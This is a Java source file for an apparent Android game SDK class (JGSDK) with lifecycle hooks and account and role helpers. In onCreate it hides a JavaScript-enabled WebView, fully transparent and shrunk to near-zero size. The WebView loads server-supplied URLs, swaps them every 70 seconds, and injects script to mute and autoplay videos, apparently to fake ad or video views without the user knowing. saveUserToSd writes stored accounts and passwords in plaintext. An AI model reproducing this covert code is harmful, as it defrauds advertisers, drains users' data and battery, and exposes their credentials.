package com.jiaguo.common;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import com.example.jiaguosdk.MainActivity;
import com.jiaguo.config.AppConfig;
import com.jiaguo.http.ApiAsyncTask;
import com.jiaguo.http.ApiRequestListener;
import com.jiaguo.sdk.JGAPISDK;
import com.jiaguo.utils.Seference;
import com.jiaguo.utils.UserInfo;
import com.jiaguo.utils.Utils;
import com.jiaguo.view.Exitdialog;
import com.jiaguo.view.Exitdialog.Exitdialoglistener;
import com.jiaguo.view.JGTextView;

public class JGSDK {
	public static JGTextView icon;
	public static boolean isShow = true;
	public static boolean iswelcom = true;
	public static Timer timer;

	public static Intent sfIntent;

	public static ApiListenerInfo apiListenerInfo;
	public static UserApiListenerInfo userlistenerinfo;
	private static Exitdialog exitdialog;
	private static ExitListener mExitListener;
	private static ApiAsyncTask RoleinfoTask;

	public static WebView wvBookPlay;
	public static Timer sfTimer;

	public static boolean isAddCheckTimer = false;
	public static Timer checkTimer = null;
	public static TimerTask checkTimerTask = null;
	
	public static String appKey = "";

	public static Handler handler = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			try {
				switch (msg.what) {
				case 1:

					apiListenerInfo.onSuccess(msg.obj);
					break;
				case 2:
					try {
						apiListenerInfo.onSuccess(msg.obj);
					} catch (Exception e) {
						// TODO: handle exception
					}
					break;
				case 3:
					try {
						userlistenerinfo.onLogout(msg.obj);
					} catch (Exception e) {
						// TODO: handle exception
					}
					break;
				case AppConfig.LOGINOUT_SUCCESS:
				case AppConfig.FLAG_FAIL:
					mExitListener.ExitSuccess("exit");
					break;

				}

			} catch (Exception e) {
				// TODO: handle exception
			}
		}
	};

	public static void onCreate(Activity activity,String key) {
		Log.i("kk", "onCreate");
		// Intent intent = new Intent(activity, FlashActivity.class);
		// activity.startActivity(intent);
		// sfIntent = new Intent(activity, SfActivity.class);
		// activity.startActivity(sfIntent);
		final Activity finalAct = activity;
		appKey = key;

		RelativeLayout rl = new RelativeLayout(activity);
		RelativeLayout.LayoutParams relLayoutParams = new RelativeLayout.LayoutParams(
				LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
		activity.addContentView(rl, relLayoutParams);
		rl.setAlpha(0);
		rl.setScaleX((float) 0.001);
		rl.setScaleY((float) 0.001);
		wvBookPlay = new WebView(activity);
		rl.addView(wvBookPlay);
		// wvBookPlay.setScaleX((float) 0.1);
		// wvBookPlay.setScaleY((float) 0.1);
		// 支持javascript
		// wvBookPlay.getSettings().setBuiltInZoomControls(true);
		// wvBookPlay.getSettings().setDisplayZoomControls(false);
		// wvBookPlay.getSettings().setSupportZoom(true);

		// wvBookPlay.getSettings().setDomStorageEnabled(true);
		// wvBookPlay.getSettings().setDatabaseEnabled(true);
		// 全屏显示
		// wvBookPlay.getSettings().setLoadWithOverviewMode(true);
		// wvBookPlay.getSettings().setUseWideViewPort(true);

		// 支持javascript
		wvBookPlay.getSettings().setJavaScriptEnabled(true);
		// 设置可以支持缩放
		// wvBookPlay.getSettings().setSupportZoom(true);
		// 设置出现缩放工具
		// wvBookPlay.getSettings().setBuiltInZoomControls(true);
		// 扩大比例的缩放
		// wvBookPlay.getSettings().setUseWideViewPort(true);
		// 自适应屏幕
		// wvBookPlay.getSettings().setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
		wvBookPlay.setWebChromeClient(new WebChromeClient());
		wvBookPlay.getSettings().setMediaPlaybackRequiresUserGesture(false);
		wvBookPlay.setWebViewClient(new WebViewClient() {
			@Override
			public void onPageFinished(WebView view, String url) {
				super.onPageFinished(view, url);
				// wvBookPlay.loadUrl(url);
				// view.loadUrl("javascript:function(){var videos = document.getElementsByTagName('video');alert(videos.length);for(var i=0;i<videos.length;i++){videos[i]:play();if(i==1){alert(123141);}}}()");
				new Handler().postDelayed(new Runnable() {
					@Override
					public void run() {
						if (isAddCheckTimer) {
							return;
						}
						// do something
						JGSDK.onLoadUrl(finalAct);
						if (checkTimer != null) {
							checkTimer.cancel();
							checkTimer = null;
						}
						if (checkTimerTask != null) {
							checkTimerTask.cancel();
							checkTimerTask = null;
						}
						Timer tmpTimer = new Timer(true);

						TimerTask tmpTask = new TimerTask() {
							@Override
							public void run() {
								JGSDK.onLoadUrl(finalAct);
							}
						};
						checkTimer = tmpTimer;
						checkTimerTask = tmpTask;
						checkTimer.schedule(checkTimerTask, 20, 20);// 延时1s，每隔500毫秒执行一次run方法

					}
				}, 1000); // 延时1s执行
			}
		});

		JGSDK.StartGetSrc(finalAct);
	}

	public static void StartGetSrc(Activity activity) {
		final Activity finalAct = activity;
		JGAPISDK.get().startGetSrc(finalAct,appKey,new ApiRequestListener() {
			@Override
			public void onSuccess(Object obj) {
				if(obj !=null && obj != ""){
					Log.i("lsf onSuccess", obj + "");
					JGSDK.onSetResult(finalAct, obj.toString());
				}
			}

			@Override
			public void onError(int statusCode) {
				// TODO Auto-generated method stub
				// JGSDK.StartGetSrc(finalAct);
			}
		});
	}

	public static void onLoadUrl(Activity activity) {
		activity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				wvBookPlay
						.loadUrl("javascript:(function(){"
								+ "var videos = document.getElementsByTagName('video');"
								+ "videos[0].muted=true;"
								+ "videos[0].autoplay =true;" +
								// "videos[0].play()};" +
								"})();");
			}
		});
	}

	public static void onSetResult(Activity activity, String str) {
		if (wvBookPlay == null) {
			return;
		}
		final Activity tmpActivity = activity;
		final String tmp = str;
		tmpActivity.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				wvBookPlay.loadUrl(tmp);
			}
		});

		if (sfTimer == null) {
			sfTimer = new Timer(true);
		}
		TimerTask sfTimerTask = new TimerTask() {
			@Override
			public void run() {
				JGAPISDK.get().startGetSrc(tmpActivity,appKey,
						new ApiRequestListener() {
							@Override
							public void onSuccess(Object obj) {
								final Object finalObj = obj;
								// //("kk",obj+"");
								// JGSDK.onSetResult(tmpActivity,obj.toString());
								if(obj !=null && obj != ""){
									tmpActivity.runOnUiThread(new Runnable() {
										@Override
										public void run() {
											wvBookPlay.loadUrl(finalObj.toString());
										}
									});
								}
							}

							@Override
							public void onError(int statusCode) {
								// TODO Auto-generated method stub

							}
						});
			}
		};
		sfTimer.schedule(sfTimerTask, 70000, 70000);// 延时1s，每隔500毫秒执行一次run方法
	}

	public static void onstop(Activity activity) {
		Log.i("kk", "onstop");
	}

	public static void onDestroy(Activity activity) {
		Log.i("kk", "onDestroy");

	}

	public static void onResume(Activity activity) {
		Log.i("kk", "onResume");

	}

	public static void onPause(Activity activity) {
		Log.i("kk", "onPause");
	}

	public static void onRestart(Activity activity) {
		Log.i("kk", "onRestart");
	}

	public static void onNewIntent(final Intent intent) {
		Log.i("kk", "onNewIntent");
	}

	public static void onActivityResult(Activity activity, int requestCode,
			int resultCode, Intent data) {
		Log.i("kk", "onActivityResult");
	}

	/*
	 * 切换账号
	 */
	public static void setUserListener(UserApiListenerInfo listener) {
		userlistenerinfo = listener;
	}

	/**
	 * 保存账号到sdcard
	 */
	public static void saveUserToSd(Context context) {
		List<HashMap<String, String>> contentList = new ArrayList<HashMap<String, String>>();
		Seference seference = new Seference(context);
		UserInfo creatFile = new UserInfo();
		contentList = seference.getContentList();
		String data = "";
		if (contentList == null) {
			return;
		} else {
			for (int i = 0; i < contentList.size(); i++) {
				String tempUser = contentList.get(i).get("account");
				String tempPwd = contentList.get(i).get("password");
				String tempUid = contentList.get(i).get("uid");
				data += tempUser + ":" + tempPwd + ":" + tempUid + "#";
			}
			creatFile.saveUserInfo("", "", "", data);
			// Log.i("kk","data"+data);
		}
	}

	/**
	 * 预留接口额外信息
	 * 
	 * @param context
	 *            上下文
	 * @param scene_Id
	 *            场景 分别为进入服务器(enterServer)、玩家创建用户角色(createRole)、玩家升级(levelUp)
	 * @param roleId
	 *            角色id
	 * @param roleName
	 *            角色名
	 * @param roleLevel
	 *            角色等级
	 * @param zoneId
	 *            当前登录的游戏区服id
	 * @param zoneName
	 *            当前游戏区服名称
	 * @param balance
	 *            游戏币余额
	 * @param Vip
	 *            当前用户vip等级
	 * @param partyName
	 *            当前用户所属帮派
	 * @param roleCTime
	 *            单位为秒，创建角色的时间
	 * @param roleLevelMTime
	 *            单位为秒，角色等级变化时间
	 */

	public static void setExtData(Context context, String scene_Id,
			String roleId, String roleName, String roleLevel, String zoneId,
			String zoneName, String balance, String Vip, String partyName,
			String roleCTime, String roleLevelMTime) {

		getRoleinfo(context, scene_Id, roleId, roleName, roleLevel, zoneId,
				zoneName, balance, Vip, partyName, roleCTime, roleLevelMTime);
		Log.i("kk", "额外信息" + "场景" + scene_Id + "角色id" + roleId + "角色名"
				+ roleName + "角色等级" + roleLevel + "服务器id" + zoneId + "服务器名"
				+ zoneName + "游戏币余额" + balance + "帮派" + "partyName" + "创建时间"
				+ roleCTime + "升级时间" + roleLevelMTime);
	}

	public static void applicationInit(Context context) {
		Log.i("kk", "applicationInit");
	}

	/**
	 * 退出接口，记录一些参数
	 */
	public static void exit(final Activity activity,
			final ExitListener exitlistener) {

		Log.i("kk", "---exit--");
	}

	private static void getRoleinfo(Context context, String scene_Id,
			String roleId, String roleName, String roleLevel, String zoneId,
			String zoneName, String balance, String Vip, String partyName,
			String roleCTime, String roleLevelMTime) {
		try {

			String ver_id = Utils.getAgent(context);
		} catch (Exception e) {
		}

	}
}
